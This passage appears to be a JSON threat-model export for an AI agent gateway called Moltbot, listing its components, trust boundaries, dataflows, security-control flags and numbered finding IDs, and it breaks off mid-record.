{"actors": [{"__class__": "Actor", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": [], "inBoundary": "Control Clients", "inScope": true, "inputs": [], "isAdmin": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Operator", "outputs": ["Operator runs CLI commands"], "overrides": [], "port": -1, "protocol": "", "severity": 0, "sourceFiles": []}, {"__class__": "Actor", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": [], "inBoundary": "Messaging Platforms", "inScope": true, "inputs": [], "isAdmin": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Channel End User", "outputs": ["End user sends channel message"], "overrides": [], "port": -1, "protocol": "", "severity": 0, "sourceFiles": []}], "assets": [{"__class__": "ExternalEntity", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": [], "handlesResources": false, "hasPhysicalAccess": false, "inBoundary": "Messaging Platforms", "inScope": true, "inputs": ["End user sends channel message", "Outbound messages to channels", "Outbound media to channels"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Channel Provider APIs", "onAWS": false, "outputs": ["Inbound channel events to Gateway", "Inbound media to Gateway"], "overrides": [], "port": -1, "protocol": "", "severity": 0, "sourceFiles": [], "usesEnvironmentVariables": false}, {"__class__": "ExternalEntity", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": [], "handlesResources": false, "hasPhysicalAccess": false, "inBoundary": "Model Providers", "inScope": true, "inputs": ["Model inference request"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "LLM Provider APIs", "onAWS": false, "outputs": ["Model inference response"], "overrides": [], "port": -1, "protocol": "", "severity": 0, "sourceFiles": [], "usesEnvironmentVariables": false}, {"__class__": "ExternalEntity", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": [], "handlesResources": false, "hasPhysicalAccess": false, "inBoundary": "Internet", "inScope": true, "inputs": [], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "External API Client", "onAWS": false, "outputs": ["External client uses Gateway HTTP APIs"], "overrides": [], "port": -1, "protocol": "", "severity": 0, "sourceFiles": [], "usesEnvironmentVariables": false}, {"__class__": "Process", "OS": "", "allowsClientSideScripting": false, "assumptions": [], "codeType": "Unmanaged", "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "environment": "", "findings": ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34"], "handlesResources": false, "implementsAPI": false, "implementsCommunicationProtocol": false, "inBoundary": "Control Clients", "inScope": true, "inputs": ["Operator runs CLI commands"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Moltbot CLI", "onAWS": false, "outputs": ["CLI connects to Gateway WS/HTTP"], "overrides": [], "port": -1, "protocol": "", "severity": 5, "sourceFiles": ["src/cli/run-main.ts", "src/cli/program/command-registry.ts"], "tracksExecutionFlow": false, "usesEnvironmentVariables": false}, {"__class__": "Process", "OS": "", "allowsClientSideScripting": false, "assumptions": [], "codeType": "Unmanaged", "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "environment": "", "findings": ["35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "60", "61", "62", "63", "64", "65", "66", "67", "68"], "handlesResources": false, "implementsAPI": false, "implementsCommunicationProtocol": false, "inBoundary": "Control Clients", "inScope": true, "inputs": [], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "WebChat / macOS UI", "onAWS": false, "outputs": ["UI connects to Gateway WS"], "overrides": [], "port": -1, "protocol": "", "severity": 5, "sourceFiles": ["docs/gateway/index.md"], "tracksExecutionFlow": false, "usesEnvironmentVariables": false}, {"__class__": "Server", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": true, "authenticationScheme": "", "authorizesSource": true, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": true, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["69", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79", "80", "81", "82", "83", "84", "85", "86", "87", "88", "89", "90", "91", "92", "93", "94", "95", "96", "97", "98", "99", "100", "101", "102", "103", "104"], "handlesResources": false, "inBoundary": "Gateway Host (Local)", "inScope": true, "inputs": ["CLI connects to Gateway WS/HTTP", "UI connects to Gateway WS", "External client uses Gateway HTTP APIs", "Normalized inbound messages", "Agent output + tool results"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Gateway WS/HTTP Server", "onAWS": false, "outputs": ["Dispatch session to agent runtime", "Read/write configuration", "Read/write credentials", "Update session metadata", "Append transcripts", "Write operational logs"], "overrides": [], "port": -1, "protocol": "", "severity": 5, "sourceFiles": ["src/gateway/server-http.ts", "src/gateway/server.ts", "src/gateway/server.impl.ts"], "usesCache": false, "usesEnvironmentVariables": false, "usesSessionTokens": false, "usesVPN": false, "usesXMLParser": false}, {"__class__": "Process", "OS": "", "allowsClientSideScripting": false, "assumptions": [], "codeType": "Unmanaged", "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "environment": "", "findings": ["105", "106", "107", "108", "109", "110", "111", "112", "113", "114", "115", "116", "117", "118", "119", "120", "121", "122", "123", "124", "125", "126", "127", "128", "129", "130", "131", "132", "133", "134", "135", "136", "137", "138"], "handlesResources": false, "implementsAPI": false, "implementsCommunicationProtocol": false, "inBoundary": "Gateway Host (Local)", "inScope": true, "inputs": ["Inbound channel events to Gateway", "Inbound media to Gateway"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Channel Adapters", "onAWS": false, "outputs": ["Normalized inbound messages", "Outbound messages to channels", "Outbound media to channels"], "overrides": [], "port": -1, "protocol": "", "severity": 5, "sourceFiles": ["src/web/inbound/monitor.ts", "src/channels"], "tracksExecutionFlow": false, "usesEnvironmentVariables": false}, {"__class__": "Process", "OS": "", "allowsClientSideScripting": false, "assumptions": [], "codeType": "Unmanaged", "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "environment": "", "findings": ["139", "140", "141", "142", "143", "144", "145", "146", "147", "148", "149", "150", "151", "152", "153", "154", "155", "156", "157", "158", "159", "160", "161", "162", "163", "164", "165", "166", "167", "168", "169", "170", "171", "172"], "handlesResources": false, "implementsAPI": false, "implementsCommunicationProtocol": false, "inBoundary": "Gateway Host (Local)", "inScope": true, "inputs": ["Model inference response", "Dispatch session to agent runtime", "Node tool responses", "Browser control responses"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Agent Runtime", "onAWS": false, "outputs": ["Model inference request", "Agent output + tool results", "Invoke node tools", "Browser control requests"], "overrides": [], "port": -1, "protocol": "", "severity": 5, "sourceFiles": ["src/auto-reply/reply/agent-runner.ts"], "tracksExecutionFlow": false, "usesEnvironmentVariables": false}, {"__class__": "Server", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["173", "174", "175", "176", "177", "178", "179", "180", "181", "182", "183", "184", "185", "186", "187", "188", "189", "190", "191", "192", "193", "194", "195", "196", "197", "198", "199", "200", "201", "202", "203", "204", "205", "206", "207", "208", "209", "210", "211", "212", "213", "214", "215", "216"], "handlesResources": false, "inBoundary": "Gateway Host (Local)", "inScope": true, "inputs": ["Browser control requests"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Browser Control Server", "onAWS": false, "outputs": ["Browser control responses"], "overrides": [], "port": -1, "protocol": "", "severity": 5, "sourceFiles": ["src/gateway/server-browser.ts"], "usesCache": false, "usesEnvironmentVariables": false, "usesSessionTokens": false, "usesVPN": false, "usesXMLParser": false}, {"__class__": "Server", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["217", "218", "219", "220", "221", "222", "223", "224", "225", "226", "227", "228", "229", "230", "231", "232", "233", "234", "235", "236", "237", "238", "239", "240", "241", "242", "243", "244", "245", "246", "247", "248", "249", "250", "251", "252", "253", "254", "255", "256", "257", "258", "259", "260"], "handlesResources": false, "inBoundary": "Node Hosts", "inScope": true, "inputs": ["Invoke node tools"], "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Node Host Agent", "onAWS": false, "outputs": ["Node tool responses"], "overrides": [], "port": -1, "protocol": "", "severity": 5, "sourceFiles": ["docs/nodes/index.md"], "usesCache": false, "usesEnvironmentVariables": false, "usesSessionTokens": false, "usesVPN": false, "usesXMLParser": false}, {"__class__": "Datastore", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["261", "262", "263", "264"], "handlesResources": false, "hasWriteAccess": false, "inBoundary": "Gateway Local Storage", "inScope": true, "inputs": ["Read/write configuration"], "isSQL": true, "isShared": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Config Store (moltbot.json)", "onAWS": false, "onRDS": false, "outputs": [], "overrides": [], "port": -1, "protocol": "", "severity": 4, "sourceFiles": ["docs/gateway/configuration.md", "src/config"], "storesLogData": false, "storesPII": false, "storesSensitiveData": false, "type": "DatastoreType.UNKNOWN", "usesEnvironmentVariables": false}, {"__class__": "Datastore", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["265", "266", "267", "268"], "handlesResources": false, "hasWriteAccess": false, "inBoundary": "Gateway Local Storage", "inScope": true, "inputs": ["Read/write credentials"], "isSQL": true, "isShared": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Credentials Store (~/.clawdbot/credentials)", "onAWS": false, "onRDS": false, "outputs": [], "overrides": [], "port": -1, "protocol": "", "severity": 4, "sourceFiles": ["docs/gateway/authentication.md", "docs/testing.md"], "storesLogData": false, "storesPII": false, "storesSensitiveData": false, "type": "DatastoreType.UNKNOWN", "usesEnvironmentVariables": false}, {"__class__": "Datastore", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["269", "270", "271", "272"], "handlesResources": false, "hasWriteAccess": false, "inBoundary": "Gateway Local Storage", "inScope": true, "inputs": ["Update session metadata"], "isSQL": true, "isShared": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Session Store (sessions.json)", "onAWS": false, "onRDS": false, "outputs": [], "overrides": [], "port": -1, "protocol": "", "severity": 4, "sourceFiles": ["docs/reference/session-management-compaction.md", "src/config/sessions.ts"], "storesLogData": false, "storesPII": false, "storesSensitiveData": false, "type": "DatastoreType.UNKNOWN", "usesEnvironmentVariables": false}, {"__class__": "Datastore", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["273", "274", "275", "276"], "handlesResources": false, "hasWriteAccess": false, "inBoundary": "Gateway Local Storage", "inScope": true, "inputs": ["Append transcripts"], "isSQL": true, "isShared": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Transcript Store (*.jsonl)", "onAWS": false, "onRDS": false, "outputs": [], "overrides": [], "port": -1, "protocol": "", "severity": 4, "sourceFiles": ["docs/reference/session-management-compaction.md", "src/config/sessions.ts"], "storesLogData": false, "storesPII": false, "storesSensitiveData": false, "type": "DatastoreType.UNKNOWN", "usesEnvironmentVariables": false}, {"__class__": "Datastore", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, "disablesiFrames": false, "encodesHeaders": false, "encodesOutput": false, "encryptsCookies": false, "encryptsSessionData": false, "handlesCrashes": false, "handlesInterruptions": false, "handlesResourceConsumption": false, "hasAccessControl": false, "implementsAuthenticationScheme": false, "implementsCSRFToken": false, "implementsNonce": false, "implementsPOLP": false, "implementsServerSideValidation": false, "implementsStrictHTTPValidation": false, "invokesScriptFilters": false, "isEncrypted": false, "isEncryptedAtRest": false, "isHardened": false, "isResilient": false, "providesConfidentiality": false, "providesIntegrity": false, "sanitizesInput": false, "tracksExecutionFlow": false, "usesCodeSigning": false, "usesEncryptionAlgorithm": "", "usesMFA": false, "usesParameterizedInput": false, "usesSecureFunctions": false, "usesStrongSessionIdentifiers": false, "usesVPN": false, "validatesContentType": false, "validatesHeaders": false, "validatesInput": false, "verifySessionIdentifiers": false}, "data": [], "description": "", "findings": ["277", "278", "279", "280"], "handlesResources": false, "hasWriteAccess": false, "inBoundary": "Gateway Local Storage", "inScope": true, "inputs": ["Write operational logs"], "isSQL": true, "isShared": false, "levels": [0], "maxClassification": "Classification.UNKNOWN", "minTLSVersion": "TLSVersion.NONE", "name": "Log Store (~/.clawdbot/logs)", "onAWS": false, "onRDS": false, "outputs": [], "overrides": [], "port": -1, "protocol": "", "severity": 4, "sourceFiles": ["docs/gateway/logging.md", "src/hooks/bundled/command-logger/handler.ts"], "storesLogData": false, "storesPII": false, "storesSensitiveData": false, "type": "DatastoreType.UNKNOWN", "usesEnvironmentVariables": false}, {"__class__": "Datastore", "OS": "", "assumptions": [], "controls": {"authenticatesDestination": false, "authenticatesSource": false, "authenticationScheme": "", "authorizesSource": false, "checksDestinationRevocation": false, "checksInputBounds": false, "definesConnectionTimeout": false, "disablesDTD": false, 